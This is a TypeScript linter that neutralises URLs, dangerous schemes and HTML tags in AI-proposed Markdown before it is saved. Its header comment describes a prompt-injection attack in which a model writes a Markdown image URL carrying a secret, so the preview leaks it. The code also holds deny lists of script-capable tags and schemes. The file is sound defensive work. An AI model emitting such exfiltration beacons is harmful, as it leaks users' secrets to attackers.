/**
 * The pre-write linter for AI-touched Markdown (ADR 0018, §6).
 *
 * The rendering-beacon class: a model under prompt injection writes
 * `![](https://host/?d=<secret>)` into a proposal, the preview renders it, the
 * WebView fetches the image — and the secret has left the device without ever
 * passing the send overview, because the desktop CSP allows `img-src https:`.
 * Reference-style images, protocol-relative `//` URLs, HTML `<img>`,
 * `srcset` and CSS `url()` do the same; links leak on a click.
 *
 * The defence does not depend on parsing Markdown the way the renderer does.
 * A linter that tries to find "the images" and "the code spans" loses the
 * moment its parser and the renderer disagree (CommonMark gives HTML tags
 * precedence over code spans, code spans end at a blank line, a backtick in a
 * fence's info string makes it no fence …) — and an attacker only needs one
 * such disagreement. So every network destination the user has not allowed is
 * made inert WHEREVER it stands:
 *
 * - `https://host/…` becomes `https[://]host/…` — no parser, linkifier or
 *   browser treats that as a URL; the text stays readable;
 * - `www.host.tld` becomes `www[.]host.tld` (GFM would autolink it);
 * - a protocol-relative `//host/…` in a destination becomes `[//]host/…`;
 * - `javascript:`, `vbscript:`, `file:`, `blob:` and non-image `data:` in a
 *   destination lose their colon (`javascript[:]…`);
 * - an HTML tag that loads or links anything not allowed, and every
 *   `<script>`, `<iframe>`, `<svg>`, `<style>`, `<object>` … tag, is escaped to
 *   literal text (`&lt;img …`).
 *
 * Fenced code blocks are left alone — they render as code — and only fences
 * that are unambiguous under CommonMark count as such. Vault-relative links,
 * wikilinks, `#anchors`, `mailto:`, `tel:` and `data:image/…` stay as they are.
 * The linter never throws, never drops text, is idempotent, and reports every
 * change as a finding for the proposal card.
 */

export type LintFindingKind = "image" | "link" | "reference-definition" | "autolink" | "bare-url" | "html";

export interface LintFinding {
  kind: LintFindingKind;
  /** The destination as written. */
  url: string;
  /** Lower-case host for network URLs, the scheme for other schemes. */
  destination: string;
}

export interface LintOptions {
  /**
   * Hosts the user allowed for this write (for example the pages a research
   * run actually read). A host matches itself and its subdomains.
   */
  allowedHosts?: readonly string[];
}

export interface LintResult {
  text: string;
  findings: LintFinding[];
}

export type UrlVerdict = { safe: true } | { safe: false; destination: string };

const NETWORK_SCHEMES = new Set(["http", "https", "ftp", "ftps", "ws", "wss"]);
const HARMLESS_SCHEMES = new Set(["mailto", "tel"]);

function hostAllowed(host: string, allowed: readonly string[]): boolean {
  const h = host.toLowerCase().replace(/\.$/, "");
  if (h === "") return false;
  return allowed.some((entry) => {
    const a = entry.trim().toLowerCase().replace(/^\*\./, "").replace(/\.$/, "");
    return a !== "" && (h === a || h.endsWith(`.${a}`));
  });
}

/** Already defused by this linter (or written inert on purpose). */
function inert(url: string): boolean {
  return /^[a-z][a-z0-9+.-]*\[:\/\/\]/i.test(url) || /^[a-z][a-z0-9+.-]*\[:\]/i.test(url) || url.startsWith("[//]");
}

/** Decides one destination as it would be fetched or opened. */
export function classifyUrl(raw: string, allowedHosts: readonly string[] = []): UrlVerdict {
  const url = raw.trim().replace(/^<|>$/g, "").trim();
  if (url === "" || url.startsWith("#") || inert(url)) return { safe: true };
  // Protocol-relative (and the backslash spellings browsers accept): the
  // renderer resolves them against https, i.e. the network.
  if (/^[\\/]{2}/.test(url)) {
    const host = url.replace(/^[\\/]+/, "").split(/[\\/?#]/)[0] ?? "";
    return hostAllowed(host, allowedHosts) ? { safe: true } : { safe: false, destination: host.toLowerCase() || "//" };
  }
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(url)?.[1]?.toLowerCase();
  if (!scheme) return { safe: true };
  if (HARMLESS_SCHEMES.has(scheme)) return { safe: true };
  if (scheme === "data") {
    return /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp)[;,]/i.test(url) ? { safe: true } : { safe: false, destination: "data" };
  }
  if (NETWORK_SCHEMES.has(scheme)) {
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      return { safe: false, destination: scheme };
    }
    return hostAllowed(parsed.hostname, allowedHosts) ? { safe: true } : { safe: false, destination: parsed.hostname.toLowerCase() };
  }
  // javascript:, vbscript:, file:, blob: and every scheme Plainva does not know.
  return { safe: false, destination: scheme };
}

/** Splits off fenced code blocks that CommonMark unambiguously treats as code. */
function splitFences(text: string): Array<{ code: boolean; text: string }> {
  const lines = text.split(/(?<=\n)/);
  const out: Array<{ code: boolean; text: string }> = [];
  let buffer = "";
  let fence: { char: string; length: number } | null = null;
  const flush = (code: boolean) => {
    if (buffer) out.push({ code, text: buffer });
    buffer = "";
  };
  for (const line of lines) {
    if (!fence) {
      const opener = fenceOpener(line.replace(/\r?\n$/, ""));
      // A backtick fence's info string may not contain a backtick — then the
      // line is no fence at all, and treating it as one would hide what follows.
      if (opener && !(opener.char === "`" && opener.info.includes("`"))) {
        flush(false);
        fence = { char: opener.char, length: opener.length };
        buffer = line;
        continue;
      }
      buffer += line;
      continue;
    }
    buffer += line;
    const closer = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(line.replace(/\r?\n$/, ""));
    if (closer && closer[1]![0] === fence.char && closer[1]!.length >= fence.length) {
      flush(true);
      fence = null;
    }
  }
  // An unclosed fence runs to the end of the document in CommonMark, too.
  flush(fence !== null);
  return out;
}

const HTML_TAG = /<\/?[a-z][a-z0-9:-]*(?:\s[^<>]*)?\/?>/gi;
const ALWAYS_ESCAPED_TAG = /^<\/?(?:script|style|iframe|frame|frameset|object|embed|applet|link|meta|base|form|svg|math|template|portal|noscript)\b/i;
const HTML_URL_ATTRIBUTE = /\b(?:src|href|srcset|poster|data|background|action|formaction|xlink:href|cite|longdesc|codebase|manifest|ping|lowsrc|dynsrc|imagesrcset)\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi;
const CSS_URL = /url\(([^)]*)\)/gi;

/** The address inside `url(…)`: blanks and one pair of quotes around it removed. */
function cssUrlValue(inner: string): string {
  const value = inner.trim();
  const quote = value[0];
  return (quote === '"' || quote === "'") && value.length > 1 && value.endsWith(quote) ? value.slice(1, -1) : value;
}

/** A fence opener: its character, the length of its run, and the info string after it. */
function fenceOpener(line: string): { char: string; length: number; info: string } | null {
  let start = 0;
  while (start < 3 && line[start] === " ") start++;
  const char = line[start];
  if (char !== "`" && char !== "~") return null;
  let end = start;
  while (line[end] === char) end++;
  return end - start >= 3 ? { char, length: end - start, info: line.slice(end) } : null;
}
// Absolute network URLs anywhere in the text. The class stops at characters a
// URL in running text does not contain; a partial match is still defused,
// because defusing only rewrites the "://".
const ABSOLUTE_URL = /\b(?:https?|ftps?|wss?):\/\/[^\s<>"'`\]\\]+/gi;
// GFM links "www." at a line start, after whitespace or after * _ ~ ( [ ] —
// the brackets are micromark's (GitHub's) rule, wider than the spec prose.
const WWW = /(?<=^|[\s*_~()[\]])www\.(?=[a-z0-9-]+\.)/gim;
// Destination positions where a protocol-relative URL or a scheme is fetched
// or opened: inline destinations, reference definitions, autolinks.
const DESTINATION = /(\]\(\s*<?|^ {0,3}\[[^\]\n]+\]:[ \t]*<?|<)([^\s<>()]*)/gm;

function contextKind(before: string): LintFindingKind {
  if (/!\[[^\]]*\]\(\s*<?$/.test(before)) return "image";
  if (/\]\(\s*<?$/.test(before)) return "link";
  if (/(?:^|\n) {0,3}\[[^\]\n]+\]:[ \t]*<?$/.test(before)) return "reference-definition";
  if (/<$/.test(before)) return "autolink";
  return "bare-url";
}

/**
 * Lints AI-proposed Markdown before it is stored.
 */
export function preWriteLint(markdown: string, options: LintOptions = {}): LintResult {
  const allowed = options.allowedHosts ?? [];
  const findings: LintFinding[] = [];
  // NUL never belongs in Markdown (and turns a file binary for git).
  const input = markdown.split(String.fromCharCode(0)).join("");

  const segments = splitFences(input).map((segment) => {
    if (segment.code) return segment.text;
    let text = segment.text;

    // 1. HTML tags that load or link something not allowed become literal
    //    text. Escaping the "<" is enough: what is left is no tag.
    text = text.replace(HTML_TAG, (tag) => {
      const always = ALWAYS_ESCAPED_TAG.test(tag);
      let unsafe: UrlVerdict | null = null;
      let url = "";
      if (!always) {
        const candidates: string[] = [];
        for (const m of tag.matchAll(HTML_URL_ATTRIBUTE)) {
          // Browsers decode character references in attributes before they
          // read the URL: `javascript&#58;` and `&#x2F;&#x2F;host` are real.
          const value = m[1]!
            .replace(/^["']|["']$/g, "")
            .replace(/&#x0*3a;?|&#0*58;?|&colon;/gi, ":")
            .replace(/&#x0*2f;?|&#0*47;?|&sol;/gi, "/")
            .replace(/&#x0*5c;?|&#0*92;?|&bsol;/gi, "\\")
            .replace(/[\t\n\r]/g, "");
          // srcset carries a list: "a.png 1x, https://host/b.png 2x".
          for (const part of value.split(",")) candidates.push(part.trim().split(/\s+/)[0] ?? "");
        }
        for (const m of tag.matchAll(CSS_URL)) candidates.push(cssUrlValue(m[1]!));
        for (const candidate of candidates) {
          const v = classifyUrl(candidate, allowed);
          if (!v.safe) {
            unsafe = v;
            url = candidate;
            break;
          }
        }
      }
      if (!always && !unsafe) return tag;
      findings.push({ kind: "html", url: url || tag.slice(1).split(/[\s>/]/)[0] || "", destination: unsafe && !unsafe.safe ? unsafe.destination : "html" });
      return `&lt;${tag.slice(1)}`;
    });

    // 2. Protocol-relative URLs and non-network schemes at destination
    //    positions (absolute network URLs are handled everywhere in step 3).
    text = text.replace(DESTINATION, (whole, lead: string, dest: string, offset: number, all: string) => {
      if (dest === "" || /^(?:https?|ftps?|wss?):\/\//i.test(dest)) return whole;
      const v = classifyUrl(dest, allowed);
      if (v.safe) return whole;
      findings.push({ kind: contextKind(all.slice(0, offset) + lead), url: dest, destination: v.destination });
      const defused = /^[\\/]{2}/.test(dest) ? `[//]${dest.replace(/^[\\/]{2}/, "")}` : dest.replace(":", "[:]");
      return lead + defused;
    });

    // 3. Absolute network URLs, wherever they stand.
    text = text.replace(ABSOLUTE_URL, (url: string, offset: number, all: string) => {
      const v = classifyUrl(url, allowed);
      if (v.safe) return url;
      findings.push({ kind: contextKind(all.slice(Math.max(0, offset - 400), offset)), url, destination: v.destination });
      return url.replace("://", "[://]");
    });

    // 4. GFM autolinks "www.host.tld" without a scheme.
    text = text.replace(WWW, (match: string, offset: number, all: string) => {
      const host = /^www\.[^\s/?#<>()"'`]+/i.exec(all.slice(offset))?.[0] ?? "";
      if (hostAllowed(host, allowed)) return match;
      findings.push({ kind: "bare-url", url: host, destination: host.toLowerCase() });
      return "www[.]";
    });

    return text;
  });

  return { text: segments.join(""), findings };
}
